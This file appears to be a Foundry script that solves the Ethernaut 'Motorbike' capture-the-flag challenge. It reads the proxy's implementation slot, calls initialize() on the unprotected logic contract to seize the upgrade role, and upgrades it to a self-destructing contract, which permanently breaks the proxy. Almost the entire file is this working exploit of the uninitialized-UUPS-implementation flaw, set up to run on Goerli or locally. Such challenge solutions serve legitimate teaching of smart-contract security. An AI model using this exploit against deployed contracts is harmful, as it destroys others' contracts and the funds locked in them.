// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Motorbike/Motorbike.sol";
import "./EngineDestroyer.sol";

contract MotorbikeScript is Script {

    address internal attacker;
    address internal deployer;
    Motorbike target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Motorbike(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            Engine engine = new Engine();
            target = new Motorbike(address(engine));
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        bytes32 implementationSlot = vm.load(address(target), bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address engineAddress = address(uint160(uint256(implementationSlot)));
        console.log("engine : %s", engineAddress);
        Engine engine = Engine(engineAddress);

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        engine.initialize();
        EngineDestroyer destroyer = new EngineDestroyer();
        engine.upgradeToAndCall(address(destroyer), abi.encodeWithSignature("destroy()"));
        vm.stopBroadcast();
    }
}